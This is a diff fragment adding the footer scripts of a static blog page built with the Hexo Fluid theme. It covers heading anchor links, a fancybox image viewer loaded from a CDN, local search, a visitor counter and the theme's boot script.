+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
 </html>
